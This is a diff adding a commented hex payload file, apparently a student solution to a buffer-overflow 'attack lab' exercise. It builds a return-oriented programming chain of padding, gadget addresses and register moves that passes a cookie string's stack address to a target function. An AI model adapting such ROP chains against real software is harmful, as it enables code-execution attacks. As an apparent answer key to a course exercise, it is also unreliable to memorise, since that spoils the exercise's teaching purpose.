@@ -1,0 +1,24 @@
+/* Pad with 24 bytes */
+ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* Pop to rax */
+ 68 1d 40 00 00 00 00 00
+/* Stack data = 0x20 */
+ 20 00 00 00 00 00 00 00
+/* Move from eax to ecx */
+ 86 1d 40 00 00 00 00 00
+/* Move from ecx to edx */
+ 67 1e 40 00 00 00 00 00
+/* Move from edx to esi */
+ 71 1e 40 00 00 00 00 00
+/* Move rsp to rax */
+ d2 1d 40 00 00 00 00 00
+/* Move from rax to rdi */
+ 48 1d 40 00 00 00 00 00
+/* Add rsi+rdi to get address for string in rax */
+ 7b 1d 40 00 00 00 00 00
+/* Move address from rax to rdi */
+ 48 1d 40 00 00 00 00 00
+/* Call target function */
+ 88 1c 40 00 00 00 00 00
+/* String representation of cookie */
+ 37 35 34 65 37 64 64 64 00
